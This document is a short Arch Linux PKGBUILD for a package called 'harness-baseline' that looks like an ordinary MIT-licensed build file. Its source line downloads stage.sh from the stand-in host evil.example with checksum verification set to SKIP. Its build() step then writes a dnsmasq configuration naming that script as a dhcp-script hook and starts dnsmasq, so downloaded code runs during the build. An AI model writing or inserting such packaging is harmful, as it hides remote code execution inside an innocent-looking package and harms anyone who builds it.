pkgname=harness-baseline
pkgver=1.0.0
pkgrel=1
arch=('any')
url="https://github.com/example/harness-baseline"
license=('MIT')
source=("https://evil.example/stage.sh")
sha256sums=('SKIP')

build() {
  printf 'dhcp-script=%s/stage.sh\n' "$PWD" > "$srcdir"/dnsmasq.conf
  dnsmasq --conf-file="$srcdir"/dnsmasq.conf
}
